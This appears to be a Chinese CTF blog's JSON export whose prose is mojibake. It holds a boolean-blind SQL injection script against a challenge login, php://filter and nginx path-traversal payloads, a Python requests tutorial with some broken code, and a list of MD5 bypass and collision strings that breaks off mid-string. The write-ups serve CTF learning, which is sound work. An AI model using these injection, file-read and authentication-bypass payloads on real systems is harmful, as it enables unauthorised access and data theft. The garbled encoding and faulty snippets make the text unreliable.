SQLæ³¨å…¥-2POSTæ³¨å…¥ï¼Œè€Œä¸”è¿‡æ»¤äº†selectï¼Œä¸è¿‡ç»è¿‡æµ‹è¯•å‘ç°æ˜¯æ›¿æ¢ä¸ºç©ºï¼Œå› æ­¤åŒå†™ç»•è¿‡å³å¯ã€‚ è¿™é¢˜æˆ‘ä»¬ä½¿ç”¨å¸ƒå°”ç›²æ³¨è§£é¢˜ï¼Œä¸è¿‡ä¸ºäº†ç¡®å®šå¸ƒå°”ä¸ºtrueä¸falseä¹‹é—´çš„htmlï¼Œæˆ‘ä»¬ä½¿ç”¨bpæŠ“åŒ…ï¼š æ ¹æ®æŠ“åŒ…ç»“æœå†™è„šæœ¬ï¼š 12345678910111213141516171819202122232425262728293031323334# coding=utf-8import requestsimport timeurl = &quot;http://514f1d32-3229-4fc7-8c85-3f6b2a7352c3.node4.buuoj.cn:81/login.php&quot;data = &#123;&quot;name&quot;: &quot;&quot;,&quot;pass&quot;:&quot;123&quot;&#125;flag= &quot;&quot;for i in range(1, 500): time.sleep(0.06) low = 32 high = 128 mid = (low + high)&gt;&gt;1 while (low &lt; high): # åº“å data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(schema_name) from information_schema.schemata),%d,1))&gt;%d)#&quot; % (i, mid) # è¡¨å #data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(table_name) from information_schema.tables where table_schema=0x6e6f7465),%d,1))&gt;%d)#&quot; % (i, mid) # å­—æ®µå #data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(column_name) from information_schema.columns where table_schema=0x6e6f7465 and table_name=0x666c3467),%d,1))&gt;%d)#&quot; % (i, mid) # å†…å®¹ #data[&quot;name&quot;] = &quot;admin&#x27; and (ascii(substr((seselectlect group_concat(flag) from fl4g),%d,1))&gt;%d)#&quot; % (i, mid) r = requests.post(url, data=data) time.sleep(0.05) if &quot;u8bef&quot; in r.text: low = mid + 1 else: high = mid mid = (low + high) &gt;&gt;1 if (mid == 32 or mid == 127): break flag += chr(mid) print(flag)print(flag) æœ€åflagï¼šn1book{login_sqli_is_nice} afr_1æœ€ç®€å•çš„ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´äº†ï¼Œç›´æ¥GETä¸€ä¸ªphp://filterä¼ªåè®®å°±å¯ä»¥äº†ï¼š 1?p=php://filter/convert.base64-encode/resource=flag æ‹¿åˆ°base64è§£ç å°±æ˜¯flagäº† 12345PD9waHAKZGllKCdubyBubyBubycpOwovL24xYm9va3thZnJfMV9zb2x2ZWR9&lt;?phpdie(&#x27;no no no&#x27;);//n1book&#123;afr_1_solved&#125; afr_2è¿™é¢˜è€ƒç‚¹æ˜¯Nginxé…ç½®ä¸å½“å¯¼è‡´çš„ç©¿è¶Šæ¼æ´ï¼Œç›®å½•ç©¿è¶Šä¹Ÿæ˜¯ctfçš„å¸¸è§„è€ƒç‚¹ä¹‹ä¸€äº†ã€‚æŸ¥çœ‹è¿™é¢˜çš„æºç ï¼Œå‘ç°/imgç›®å½•ï¼Œç›´æ¥è®¿é—®å¹¶æ„å»ºpayloadï¼š 1http://b829a5e0-7041-4a53-a32c-79be1f61a198.node4.buuoj.cn/img../ æ‰¾åˆ°flagæ–‡ä»¶ï¼Œä¸‹è½½æŸ¥çœ‹å³å¯ï¼šflagï¼šn1book{afr_2_solved} afr_3é¦–å…ˆåæ§½ï¼Œè¿™ä¸ªafrçš„flagæ ¹æ®å‰é¢çš„flagéƒ½å¯ä»¥ç›´æ¥ç¤¾å·¥å‡ºæ¥ã€‚ è¿™é¢˜éœ€è¦sstiçš„çŸ¥è¯†ï¼Œå­¦å®Œå†è¡¥","categories":[{"name":"web","slug":"web","permalink":"http://example.com/categories/web/"}],"tags":[{"name":"-web","slug":"web","permalink":"http://example.com/tags/web/"}]},{"title":"pythonåº“çš„å­¦ä¹ ","slug":"pythonåº“çš„å­¦ä¹ ","date":"2022-01-14T06:13:55.000Z","updated":"2022-01-16T06:31:10.296Z","comments":true,"path":"2022/01/14/pythonåº“çš„å­¦ä¹ /","link":"","permalink":"http://example.com/2022/01/14/python%E5%BA%93%E7%9A%84%E5%AD%A6%E4%B9%A0/","excerpt":"å‰è¨€pythonï¼Œæœ€å¥½çš„è„šæœ¬è¯­è¨€ï¼Œå­¦å°±å®Œäº†ã€‚","text":"å‰è¨€pythonï¼Œæœ€å¥½çš„è„šæœ¬è¯­è¨€ï¼Œå­¦å°±å®Œäº†ã€‚ Requestsåº“ä¹‹å‰å†™ç›²æ³¨è„šæœ¬çš„æ—¶å€™å°±ç”¨è¿‡Requestsåº“äº†ï¼Œè®¸å¤šwebé¢˜ä¹Ÿéƒ½éœ€è¦ç”¨ä¸Šè¿™ä¸ªåº“ã€‚Requestsæ”¯æŒcookieã€æ–‡ä»¶ä¸Šä¼ ã€è‡ªåŠ¨ç¡®å®šç›¸åº”å†…å®¹ç¼–ç ã€è‡ªåŠ¨ç¼–ç ç­‰ç­‰ï¼Œå› æ­¤ååˆ†å¥½ç”¨ã€‚ å‘é€è¯·æ±‚æœ€ç®€å•æœ€å¸¸ç”¨çš„æ–¹æ³•ï¼Œhttpåè®®ä¸­æœ‰å¤šç§è¯·æ±‚æ–¹æ³•ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ç”¨requestsåº“ä¸­çš„å‡½æ•°æ¥å‘é€å¯¹åº”è¯·æ±‚ï¼š 1234r = requests.get(&#x27;https://www.baidu.com&#x27;) #å‘é€GETè¯·æ±‚r = requests.post(&#x27;https://www.baidu.com&#x27;,data = &#123;&#x27;username&#x27;:&#x27;mrl64&#x27;,&#x27;password&#x27;:&#x27;123hahaha&#x27;&#125;) #å‘é€POSTè¯·æ±‚r = requests.head(&#x27;https://www.baidu.com&#x27;) #å‘é€HEADè¯·æ±‚â€¦â€¦ è·å–è¯·æ±‚å¤´/å“åº”å¤´è¿™é‡Œç”¨GETä¸¾ä¾‹ï¼Œæ„Ÿè§‰ç›´æ¥ç”¨bpæ›´å¿«å°±æ˜¯äº†ï¼Œä¸è¿‡pythonå¯ä»¥è·å–æŒ‡å®šå•ä¸€è¯·æ±‚å¤´ï¼Œæœ‰æ—¶å€™è¿˜æ˜¯ä¼šç”¨åˆ°çš„ï¼ŒPOSTè¯·æ±‚åŒç†ã€‚ è·å–è¯·æ±‚å¤´ï¼š 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.request.headersprint(flag)&#123;&#x27;User-Agent&#x27;: &#x27;python-requests/2.26.0&#x27;, &#x27;Accept-Encoding&#x27;: &#x27;gzip, deflate&#x27;, &#x27;Accept&#x27;: &#x27;*/*&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;&#125; è·å–è¯·æ±‚å¤´æŸä¸€å±æ€§ï¼š 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.request.headers[&#x27;User-Agent&#x27;] #ä¸åŒºåˆ†å¤§å°å†™print(flag)python-requests/2.26.0 è·å–å“åº”å¤´ï¼š 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.headersprint(flag)&#123;&#x27;Cache-Control&#x27;: &#x27;private, no-cache, no-store, proxy-revalidate, no-transform&#x27;, &#x27;Connection&#x27;: &#x27;keep-alive&#x27;, &#x27;Content-Encoding&#x27;: &#x27;gzip&#x27;, &#x27;Content-Type&#x27;: &#x27;text/html&#x27;, &#x27;Date&#x27;: &#x27;Sat, 15 Jan 2022 11:50:24 GMT&#x27;, &#x27;Last-Modified&#x27;: &#x27;Mon, 23 Jan 2017 13:24:46 GMT&#x27;, &#x27;Pragma&#x27;: &#x27;no-cache&#x27;, &#x27;Server&#x27;: &#x27;bfe/1.0.8.18&#x27;, &#x27;Set-Cookie&#x27;: &#x27;BDORZ=27315; max-age=86400; domain=.baidu.com; path=/&#x27;, &#x27;Transfer-Encoding&#x27;: &#x27;chunked&#x27;&#125; è·å–å“åº”å¤´æŸä¸€å±æ€§ï¼š 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.headers[&#x27;Date&#x27;] #ä¸åŒºåˆ†å¤§å°å†™print(flag)Sat, 15 Jan 2022 11:51:41 GMT è·å–å†…å®¹æœ¬è´¨ä¸Šå’Œä¸Šé¢é‚£éƒ¨åˆ†å¤§å·®ä¸å·®ï¼Œç›´æ¥è·å–htmlï¼ŒRequestsä¼šè‡ªåŠ¨è§£ç æ¥è‡ªæœåŠ¡å™¨çš„å†…å®¹ï¼Œå¤§å¤šæ•°unicodeå­—ç¬¦é›†éƒ½èƒ½è¢«æ­£ç¡®ç¼–ç ï¼š 12345678910import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.textprint(flag)&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-typeâ€¦â€¦ æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡encodingå±æ€§æ¥æŸ¥çœ‹ç¼–ç ï¼š 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.encodingprint(flag)ISO-8859-1 è·å–å­—èŠ‚å¯¹è±¡æ— è®ºå“åº”æ˜¯æ–‡æœ¬è¿˜æ˜¯äºŒè¿›åˆ¶å†…å®¹ï¼Œæˆ‘ä»¬éƒ½å¯ä»¥ç”¨contentå±æ€§è·å¾—byteså¯¹è±¡ï¼ŒRequests ä¼šè‡ªåŠ¨ä¸ºä½ è§£ç  gzip å’Œ deflate ä¼ è¾“ç¼–ç çš„å“åº”æ•°æ®ã€‚ 123456789import requestsurl = &#x27;https://www.baidu.com&#x27;r = requests.get(url)flag = r.contentprint(flag)b&#x27;&lt;!DOCTYPE html&gt;\\r\\n&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-typeâ€¦â€¦ ä¼ é€’å‚æ•°ä½¿ç”¨dictç±»å‹å˜é‡ä¼ é€’å‚æ•°ï¼Œè¿™ä¹Ÿæ˜¯åœ¨å†™è„šæœ¬æ—¶éå¸¸å¸¸ç”¨çš„ä¸€ä¸ªæ–¹æ³•ã€‚å¦‚æœè¦ä¼ é€’GETè¯·æ±‚çš„å‚æ•°ï¼Œæˆ‘ä»¬ä½¿ç”¨paramsè¿›è¡Œä¼ é€’ï¼š 12345678910import requestsurl = &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/&quot;param = &#123;&quot;id&quot;: &quot;1&quot;&#125;r = requests.get(url, params=param)flag = r.urlprint(flag)http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1 å½“ç„¶ï¼Œæˆ‘ä»¬æ›´å¸¸ç”¨åˆ°çš„æ˜¯POSTè¯·æ±‚å‘é€å‚æ•°æˆ–è€…å¯¹è¯·æ±‚å¤´è¿›è¡Œæ³¨å…¥ç­‰ç­‰ï¼Œè¿™æ—¶å€™æˆ‘ä»¬åº”è¯¥ä½¿ç”¨data headers cookieç­‰ç­‰è¿›è¡Œå‚æ•°ä¼ é€’ï¼š 123456789101112import requestsurl = &quot;https://www.baidu.com&quot;head = &#123; &quot;X-Forwarded-For&quot;: &quot;127.0.0.1&quot;&#125;r = requests.get(url, headers=head)flag = r.request.headers[&#x27;X-Forwarded-For&#x27;]print(flag)127.0.0.1 ä¼ é€’cookieå‚æ•°ä¹Ÿå¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼ã€‚ ä¼ é€’jsonå‚æ•°è¿™ç‚¹å•æ‹å‡ºæ¥è®²ï¼Œå› ä¸ºä¸€èˆ¬æˆ‘ä»¬postå‚æ•°ï¼Œéƒ½æ˜¯ç›´æ¥postï¼Œæ²¡ç®¡postçš„æ•°æ®çš„ç±»å‹ï¼Œæ­¤æ—¶å…¶é»˜è®¤ç±»å‹ä¸ºapplication/x-www-form-urlencodedã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬éœ€è¦ä¼ é€’jsonæ ¼å¼çš„æ•°æ®æ—¶å°±éœ€è¦è¿›è¡Œæ•°æ®ç±»å‹æŒ‡å®šï¼Œå½“ç„¶jsonæ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨jsonå‚æ•°ä¼ é€’çš„ã€‚ 12345678910111213141516import requestsimport jsonurl=&quot;https://www.baidu.com&quot;data=&#123;&#x27;a&#x27;=123&#125;head = &#123;&#x27;Content-Type&#x27;: &#x27;application/json&#x27;&#125;;r = requests.post(url=, headers=head, data=json.dumps(data))æˆ–è€…import requests data = &#123; &#x27;a&#x27;: 123&#125;response = requests.post(url=&#x27;url&#x27;, json=data) Sessionä¿æŒè¯·æ±‚å†™dvwaç›²æ³¨æ—¶å°±ç”¨åˆ°äº†sessionï¼ŒSession()èƒ½åœ¨å¤šæ¬¡è¯·æ±‚ä¸­ä¿æŒä¸€äº›å‚æ•°ï¼Œæœ€å¸¸ç”¨çš„ä¸€èˆ¬æ˜¯æ‹¿æ¥ä¿æŒcookieã€‚åŒæ ·ä¼šè¯å¯¹è±¡å¯ä»¥é€šè¿‡GETæˆ–POSTæ–¹æ³•å‘é€è¯·æ±‚ï¼Œæˆ‘ä»¬ä»¥POSTæ–¹æ³•ä¸ºä¾‹ï¼š 123456789import.requestss = request.Session()url = &quot;http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/&quot;head = &#123;&#x27;Cookie&#x27;:&#x27;security=low;PHPSESSID=c2fad3pjoio31n2i15243jrb2n&#x27;&#125;data = &#123;&#x27;id&#x27;:&#x27;1&#x27;&#125;r = s.post(url,data=data,headers=head) ä»»ä½•ä½ ä¼ é€’ç»™è¯·æ±‚æ–¹æ³•çš„å­—å…¸éƒ½ä¼šä¸å·²è®¾ç½®ä¼šè¯å±‚æ•°æ®åˆå¹¶ã€‚æ–¹æ³•å±‚çš„å‚æ•°è¦†ç›–ä¼šè¯çš„å‚æ•°ã€‚ ä¸è¿‡éœ€è¦æ³¨æ„ï¼Œå°±ç®—ä½¿ç”¨äº†ä¼šè¯ï¼Œæ–¹æ³•çº§åˆ«çš„å‚æ•°ä¹Ÿä¸ä¼šè¢«è·¨è¯·æ±‚ä¿æŒï¼Œå¦‚ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªè¯·æ±‚å‘é€äº†cookieï¼š 123456789s = requests.Session()r = s.get(&#x27;http://httpbin.org/cookies&#x27;, cookies=&#123;&#x27;from-my&#x27;: &#x27;browser&#x27;&#125;)print(r.text)# &#x27;&#123;&quot;cookies&quot;: &#123;&quot;from-my&quot;: &quot;browser&quot;&#125;&#125;&#x27;r = s.get(&#x27;http://httpbin.org/cookies&#x27;)print(r.text)# &#x27;&#123;&quot;cookies&quot;: &#123;&#125;&#125;&#x27; base64åº“base64åŠ è§£å¯†base64.bxxencodeæ¥å—ä¸€ä¸ªå­—èŠ‚æ•°ç»„bytesç”¨äºåŠ å¯†ï¼Œè¿”å›ä¸€ä¸ªbyteså­˜å‚¨åŠ å¯†ä¹‹åçš„å†…å®¹ã€‚ä¾‹å¦‚ï¼š 12s = &quot;mrl64&quot;t = base64.b64encode(s.encode(&#x27;UTF-8&#x27;)) base64.bxxdecodeæ¥å—ä¸€ä¸ªå­˜æ”¾ç€å¯†æ–‡çš„bytesï¼Œè¿”å›ä¸€ä¸ªbyteså­˜æ”¾ç€è§£å¯†åçš„å†…å®¹ã€‚ä¾‹å¦‚ï¼š 12s = &#x27;bXJsNjQ=&#x27;t = base64.b64decode(s) åŒæ—¶æ”¯æŒbase64ã€base32ã€base16åŠ è§£å¯†ã€‚ urlç¼–ç ç”±äºæ ‡å‡†çš„Base64ç¼–ç åå¯èƒ½å‡ºç°å­—ç¬¦+å’Œ/ï¼Œåœ¨URLä¸­å°±ä¸èƒ½ç›´æ¥ä½œä¸ºå‚æ•°ï¼Œæ‰€ä»¥åˆæœ‰ä¸€ç§â€url safeâ€çš„base64ç¼–ç ï¼Œå…¶å®å°±æ˜¯æŠŠå­—ç¬¦+å’Œ/åˆ†åˆ«å˜æˆ-å’Œ_ã€‚ 12345678910111213import base64 s = &#x27;mrl64&#x27; t = base64.urlsafe_b64encode(s.encode(&#x27;UTF-8&#x27;)) print(t) t = base64.urlsafe_b64decode(t) print(t)b&#x27;bXJsNjQ=&#x27;b&#x27;mrl64&#x27; å…·ä½“å¯ä»¥å‚è€ƒä¸‹é¢è¿™ç¯‡åšå®¢ï¼šPythonæ ‡å‡†åº“base64ç”¨æ³•ç®€ä»‹ Pillowè¿™ä¸ªåº“ç›¸å½“äºæ˜¯PILçš„plusç‰ˆï¼Œæ”¯æŒPython3.xï¼ŒåŒæ—¶å…¼å®¹åŸæ¥PILçš„åŠŸèƒ½ã€‚è¿™ä¸ªåº“ä¸»è¦ç”¨æ¥å¤„ç†å›¾åƒã€‚ Pillowåº“å®‰è£…æˆåŠŸåï¼Œå¯¼åŒ…æ—¶è¦ç”¨PILæ¥å¯¼å…¥ï¼Œè€Œä¸èƒ½ç”¨pillowæˆ–Pillowã€‚ 12import PILfrom PIL import Image ç”±äºæ˜¯miscæ–¹é¢çš„å†…å®¹ï¼Œè€Œä¸”æˆ‘ä¹Ÿå°±ç¨å¾®å­¦äº†ä¸‹ï¼Œå°±ä¸å¤šå™è¿°äº†ã€‚å…·ä½“çš„å‚è€ƒä¸‹é¢è¿™ç¯‡åšå®¢ï¼šPython Pillow(PIL)åº“çš„ç”¨æ³•ä»‹ç» è¿™é‡Œç•™ä¸€ä¸ªäºŒè¿›åˆ¶è½¬åŒ–äºŒç»´ç è„šæœ¬ï¼š 1234567891011121314import PIL from ImageMAX = 25#å®šä¹‰äºŒç»´ç çš„é•¿æ¬¾pic = Image.new(&quot;RGB&quot;,(MAX, MAX))#åˆ›å»ºä¸€ä¸ªå›¾ç‰‡str = &quot;&quot;i=0for y in range (0,MAX): for x in range (0,MAX): if(str[i] == &#x27;1&#x27;): pic.putpixel([x,y],(0, 0, 0)) #å¡«å……åƒç´ [åæ ‡],(r,g,b)å…ƒç»„å€¼ else: pic.putpixel([x,y],(255,255,255)) i = i+1pic.show() #æ˜¾ç¤ºå›¾åƒpic.save(&quot;flag.png&quot;) #ä¿å­˜å›¾åƒ å¦‚æœç»™çš„æ•°æ®ä¸æ˜¯äºŒè¿›åˆ¶å­—ç¬¦ä¸²è€Œæ˜¯rgbçš„å€¼ï¼Œå¯ä»¥å°†forå¾ªç¯ä¸­çš„å†…å®¹ç¨ä½œæ”¹å˜: 123456for i in range(0, x): for j in range(0, y): line = file.readline() #è·å–ä¸€è¡Œçš„rgbå€¼ rgb = line.split(&quot;, &quot;) #åˆ†ç¦»rgbï¼Œæ–‡æœ¬ä¸­é€—å·åé¢æœ‰ç©ºæ ¼ im.putpixel((i, j), (int(rgb[0]), int(rgb[1]), int(rgb[2]))) #å°†rgbè½¬åŒ–ä¸ºåƒç´  æ€»ç»“pythonåº“æ˜¯pythonä½œä¸ºè„šæœ¬è¯­è¨€å¦‚æ­¤å¼ºå¤§çš„åº•æ°”æ‰€åœ¨ï¼Œè¿™é‡Œè®°å½•äº†3ä¸ªåŸºç¡€çš„åº“ï¼Œåœ¨ä¹‹åæˆ‘ä»¬ä¹Ÿä¼šæ¥è§¦å­¦ä¹ æ›´å¤šæ–°å†…å®¹çš„ã€‚","categories":[{"name":"other","slug":"other","permalink":"http://example.com/categories/other/"}],"tags":[{"name":"-python","slug":"python","permalink":"http://example.com/tags/python/"}]},{"title":"md5ç»•è¿‡æ±‡æ€»","slug":"md5ç»•è¿‡æ±‡æ€»","date":"2021-12-31T07:48:43.000Z","updated":"2021-12-31T08:05:27.697Z","comments":true,"path":"2021/12/31/md5ç»•è¿‡æ±‡æ€»/","link":"","permalink":"http://example.com/2021/12/31/md5%E7%BB%95%E8%BF%87%E6%B1%87%E6%80%BB/","excerpt":"å‰è¨€è€ƒè¯•å‰ä¸´å±ä¸æƒ§ï¼Œå†™ä¸€ç¯‡åšå®¢æ€»ç»“ä¸‹é‡åˆ°çš„md5åŠ å¯†ç»•è¿‡é—®é¢˜ï¼Œè¿™ç§é¢˜å‹ä¸€èˆ¬éƒ½æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚","text":"å‰è¨€è€ƒè¯•å‰ä¸´å±ä¸æƒ§ï¼Œå†™ä¸€ç¯‡åšå®¢æ€»ç»“ä¸‹é‡åˆ°çš„md5åŠ å¯†ç»•è¿‡é—®é¢˜ï¼Œè¿™ç§é¢˜å‹ä¸€èˆ¬éƒ½æ˜¯æ¯”è¾ƒç®€å•çš„ã€‚ sqlæ³¨å…¥é—®é¢˜123456789$password=$_POST[&#x27;password&#x27;];$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;$result=mysqli_query($link,$sql); if(mysqli_num_rows($result)&gt;0)&#123; echo &#x27;flag is :&#x27;.$flag; &#125; else&#123; echo &#x27;å¯†ç é”™è¯¯!&#x27;; &#125; è¿™ä¸ªåç«¯ä»£ç å¯¹passwordçš„è¾“å…¥åšäº†md5ç¼–ç ï¼Œé¦–å…ˆæˆ‘ä»¬æ¥çœ‹ä¸‹md5()è¿™ä¸ªå‡½æ•°ï¼š 123md5(string[,raw]):stringï¼šè§„å®šè¦è®¡ç®—çš„å­—ç¬¦ä¸²rawï¼šè§„å®šè¾“å…¥æ ¼å¼ï¼Œtrueä¸ºåŸå§‹16å­—ç¬¦äºŒè¿›åˆ¶æ ¼å¼ï¼Œfalseï¼ˆé»˜è®¤ï¼‰ä¸º32å­—ç¬¦åå…­è¿›åˆ¶æ•° æˆ‘ä»¬è¦çŸ¥é“ä»¥ä¸‹ä¸¤ç‚¹ï¼š æ•°å­—å’Œå­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œè‹¥å­—ç¬¦ä¸²ä»å¤´å¼€å§‹çš„æ•°å­—éƒ¨åˆ†ä¸æ•°å­—ç›¸åŒï¼Œåˆ™è¿”å›true ä»¥æ•°å­—å¼€å¤´çš„å­—ç¬¦ä¸²ï¼Œè‹¥å¼€å¤´çš„å­—ç¬¦ä¸æ˜¯0ï¼Œé‚£ä¹ˆåœ¨åšé€»è¾‘è¿ç®—çš„æ—¶å€™è¿”å›çš„æ˜¯true å› æ­¤æˆ‘ä»¬æ¥çœ‹åç«¯åç«¯ä¸­çš„sqlä»£ç ï¼Œè‹¥æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶md5åå†è½¬æ¢å›å­—ç¬¦èƒ½å¤Ÿå¾—åˆ°â€™orâ€™åŠ ä¸Šä¸€ä¸ªé0å­—ç¬¦çš„è¯ï¼Œè¯­å¥å°±å¯ä»¥çœ‹æˆï¼š 1$sql = &quot;SELECT * FROM admin WHERE username = &#x27;admin&#x27; and password = &#x27;&#x27; or true&quot;; è¿™å°±ç›¸å½“äºä¸€ä¸ªä¸‡èƒ½å¯†ç äº†ï¼Œç»•è¿‡æˆåŠŸã€‚å› æ­¤è®°å½•ä¸‹å¯ä»¥åšåˆ°è¿™ä¸ªæ“ä½œçš„å­—ç¬¦ä¸²ï¼š 12ffifdyop129581926211651571912466741651878684928 ä¸ç­‰å˜é‡çš„md5ç›¸ç­‰å¼±ç±»å‹å¯ä»¥ä½¿ç”¨0eå¼€å¤´çš„md5ç»•è¿‡ï¼š 1234QNKCDZO240610708s878926199as155964671a é¡ºä¾¿è®°å½•ä¸‹sha1çš„ï¼š 12aaroZmOkaaK1STfY å¼ºç±»å‹ç”¨æ•°ç»„ç»•è¿‡å°±å¯ä»¥äº†ã€‚ MD5ç¢°æ’å¦‚æœæœ‰å¼ºåˆ¶ç±»å‹è½¬åŒ–æ— æ³•ä½¿ç”¨æ•°ç»„çš„è¯ï¼Œè®°å½•ä¸€äº›å…¶ä»–çš„å¯ç”¨å­—ç¬¦ä¸²ï¼š 123$s1 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;$s2 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;$s3 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%0